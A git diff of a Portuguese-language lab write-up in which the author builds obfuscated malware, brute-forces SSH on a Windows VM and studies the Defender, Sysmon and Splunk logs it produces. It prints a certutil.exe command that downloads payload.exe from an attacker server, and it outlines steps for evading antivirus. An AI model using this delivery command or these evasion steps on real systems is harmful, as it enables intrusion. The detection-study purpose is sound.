@@ -18,10 +18,10 @@ Nunca execute essas técnicas em sistemas que você não possui ou não tem auto
 
 | Componente     | Detalhes                                          |
 |----------------|---------------------------------------------------|
-| Atacante       | Kali Linux (versão XX)                            |
-| Alvo           | Windows 10 (versão XX) com Sysmon                 |
+| Atacante       | Kali Linux                                        |
+| Alvo           | Windows 10                                        |
 | Ferramentas    | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
-| Técnica usada  | Reverse Shell / etc.  |
+| Técnica usada  | Brute Force, reverse shel, LOLbin                 |
 
 ---
 
@@ -33,7 +33,7 @@ Nunca execute essas técnicas em sistemas que você não possui ou não tem auto
  (PRINT DO PROGRAMA SERVICES/SPLUNK)
  ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)
 
- Para receber os logs em splunk voce deve colocar este codigo no arquvi output.conf caso ainda nao tenha sido configurado
+ Para receber os logs em splunk voce deve colocar este codigo no arquvivo output.conf do splunk caso ainda nao tenha sido configurado
   
   (PRINT DO ARQUIVO DE CONFIGURACAO SPLUNK)
 ![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)
@@ -63,7 +63,7 @@ shellcode nos usamos este comando para converter o resultado em codigo hexadecim
 
 Agora nos temos um shellcode pronto para ser inserido no codigo.
 
-# Diferenca entre *VirtualAlloc e HeapAlloc*     
+# Sobre *VirtualAlloc e HeapAlloc*     
 
    Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
  pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
@@ -206,7 +206,7 @@ After configure the .spec file we generate the final executable from the .spec i
 
 ```bash
 wine cmd
-pyinstaller malwareobfuscated.spec
+pyinstaller --onefile malwareobfuscated.spec
 ```
 
 ![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
@@ -218,9 +218,9 @@ Esse e o resultado final do processo de criacao agora estamos prontos para reali
 
 ## DELIVERING THE PAYLOAD 
 
-Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o payload
-para realizar a requisicao vamos usar um executavel chamado certutil.exe que foi criado para gerenciar certificados digitais mais tambem pode ser usado como LOLbin por atacantes que nao querem
-chamar atencao. 
+Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o malware.
+Para realizar a requisicao vamos usar um executavel chamado ```certutil.exe``` que foi criado originalmente para gerenciar certificados digitais entretanto foi muito usado como LOLbin por hackers que nao querem
+deixar rastros o uso de certutil ja e bem conhecido pelos sistemas de defesa mas eu quero testar a execucao e o comportamento do sistema de defesa em uma situacao real. 
 
  ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
 
@@ -235,9 +235,9 @@ Logo apos realizei a requisicao usando certutil.exe como LOLbin:
  
 ![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)
 
-A principio pensei que o certutil.exe tivesse baixado o malware e logo apos o malware ter sido bloqueado pelo Windows Defender entretanto notei que nao havia 
+A principio pensei que o certutil.exe tivesse conseguido baixar o malware e logo apos Windows Defender teria bloqueado a execucao entretanto notei que nao havia 
 nenhum aviso de requisicao GET recebida pelo python server(como pode ser visto no screenchot acima) o que me leva a pensar que o sistema bloqueou a requisicao antes de ser feita. 
-Para tirar a duvida tentei realizar uma requisicao para um site benigno google.com mas recebi o mesmo output do windows, procurando nos logs do event viewer encontrei esse registro
+Para tirar a duvida tentei realizar uma requisicao para um site benigno ```google.com``` usando ```certutil.exe``` mas recebi o mesmo output do windows, procurando nos logs do event viewer encontrei esse registro
 
 🔍 **Microsoft Defender Detection Log**
 ```
@@ -261,11 +261,8 @@ Para tirar a duvida tentei realizar uma requisicao para um site benigno google.c
 
 
  Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
- ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao obser somente o destino das requisicoes mas 
- tem o comportanto do servicos (behaviour-based).
-
-
-
+ ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao observa somente o destino das requisicoes mas 
+ mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).
 
 
 Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl 
@@ -274,8 +271,8 @@ Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma 
 ![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)
 
 
- Infelizmente eu nao consegui ofuscar o antivirus p suficiente a ponto de nao ser detectado pelo sistema de defesa
-porem ainda podemos analisar os logs gerados durante a acao.
+ Mesmo com a encryptacao e ofuscacao o windows defender detectou a presenca do malware e o bloqueou porem 
+ essa atividade gerou alguns logs interessantes que vamos analisar no proximo capitulo
 
 ![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)
 
@@ -291,11 +288,9 @@ Trecho da config usada (ou link para ela).
 
 
 *TENTATIVAS DE LOGIN*
-A principio o que mais acenederia um alerta analisando os logs em splunk seria a quantidade de tentantivas 
-de login via ssh em um curto espaco de tempo caraterizando um brute force attack 
+
 
 *LOGS EM SPLUNK*
-
 ![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
 Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
 a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
